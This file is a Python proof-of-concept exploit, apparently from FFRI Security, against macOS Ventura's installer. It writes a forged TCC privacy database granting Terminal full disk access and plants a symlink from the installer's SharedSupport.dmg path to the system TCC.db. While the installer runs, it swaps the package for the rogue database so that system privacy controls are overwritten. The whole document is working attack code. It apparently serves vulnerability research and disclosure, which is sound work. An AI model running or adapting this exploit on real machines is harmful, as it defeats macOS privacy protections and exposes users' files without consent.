#
# (c) FFRI Security, Inc., 2023 / Author: FFRI Security, Inc.
#
import os
import glob
import subprocess


def create_tcc_db():
    with open("/tmp/tcc.sqlite3", "w") as fout:
        fout.write("""
    PRAGMA foreign_keys=OFF;
    BEGIN TRANSACTION;
    CREATE TABLE admin (key TEXT PRIMARY KEY NOT NULL, value INTEGER NOT NULL);
    INSERT INTO admin VALUES('version',24);
    CREATE TABLE policies (    id        INTEGER    NOT NULL PRIMARY KEY,     bundle_id    TEXT    NOT NULL,     uuid        TEXT    NOT NULL,     display        TEXT    NOT NULL,     UNIQUE (bundle_id, uuid));
    CREATE TABLE active_policy (    client        TEXT    NOT NULL,     client_type    INTEGER    NOT NULL,     policy_id    INTEGER NOT NULL,     PRIMARY KEY (client, client_type),     FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);
    CREATE TABLE access (    service        TEXT        NOT NULL,     client         TEXT        NOT NULL,     client_type    INTEGER     NOT NULL,     auth_value     INTEGER     NOT NULL,     auth_reason    INTEGER     NOT NULL,     auth_version   INTEGER     NOT NULL,     csreq          BLOB,     policy_id      INTEGER,     indirect_object_identifier_type    INTEGER,     indirect_object_identifier         TEXT NOT NULL DEFAULT 'UNUSED',     indirect_object_code_identity      BLOB,     flags          INTEGER,     last_modified  INTEGER     NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),     PRIMARY KEY (service, client, client_type, indirect_object_identifier),    FOREIGN KEY (policy_id) REFERENCES policies(id) ON DELETE CASCADE ON UPDATE CASCADE);
    INSERT INTO access VALUES('kTCCServiceSystemPolicyAllFiles','com.apple.Terminal',0,2,4,1,X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',NULL,0,'UNUSED',NULL,0,1671417617);
    CREATE TABLE access_overrides (    service        TEXT    NOT NULL PRIMARY KEY);
    CREATE TABLE expired (    service        TEXT        NOT NULL,     client         TEXT        NOT NULL,     client_type    INTEGER     NOT NULL,     csreq          BLOB,     last_modified  INTEGER     NOT NULL ,     expired_at     INTEGER     NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)),     PRIMARY KEY (service, client, client_type));
    CREATE INDEX active_policy_id ON active_policy(policy_id);
    COMMIT;
    """)
    output_tccdb = "/tmp/TCC.db"
    os.system(f"sqlite3 {output_tccdb} < /tmp/tcc.sqlite3")
    return output_tccdb


def is_mounted(path: str) -> bool:
    raw_output = subprocess.run(
        [
            "mount"
        ],
        stdout=subprocess.PIPE,
        check=True,
    ).stdout.decode("utf-8")
    return path in raw_output


def _main():
    if os.geteuid() != 0:
        print("Please run this script as root")
        return

    shared_support_path = "/Applications/Install macOS Ventura beta.app/Contents/SharedSupport"
    shared_support_dmg = "SharedSupport.dmg"

    print(f"Please remove /Applications/Install macOS Ventura beta.app if you previously installed it.")
    input()

    print("[+] Removing /tmp/TCC.db /tmp/tcc.sqlite3")
    os.system(f"rm -f /tmp/TCC.db /tmp/tcc.sqlite3")

    target_path = "/Library/Application Support/com.apple.TCC/TCC.db"

    print(f"[+] Creating {shared_support_path}")
    os.system(f"mkdir -p '{shared_support_path}'")
    os.system(f"ln -s '{target_path}' '{os.path.join(shared_support_path, shared_support_dmg)}'")

    if is_mounted("/tmp/mnt"):
        os.system("hdiutil detach /tmp/mnt")

    os.system("mkdir -p /tmp/mnt")
    print("[+] Creating temporary disk image")
    os.system("rm -f /tmp/temp.dmg")
    os.system("hdiutil create -size 13GB -volname temp -fs HFS+ /tmp/temp.dmg")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/temp.dmg")

    print("[+] Copying InstallAssistant.pkg")
    os.system("cp InstallAssistant.pkg /tmp/mnt/")

    print("[+] Creating /tmp/TCC.db")
    tcc_db = create_tcc_db()

    os.system("installer -pkg /tmp/mnt/InstallAssistant.pkg -target / &")

    while True:
        if glob.glob("/Library/Apple/System/Library/InstallerSandboxes/.PKInstallSandboxManager-SystemSoftware/*.activeSandbox/Scripts/*/postinstall.sh"):
            print("[+] Replacing /tmp/mnt/InstallAssistant.pkg with rogue file")
            os.system("mv /tmp/mnt/InstallAssistant.pkg /tmp/mnt/InstallAssistant.pkg.tmp")
            os.system(f"cp {tcc_db} /tmp/mnt/InstallAssistant.pkg")
            break


if __name__ == "__main__":
    _main()
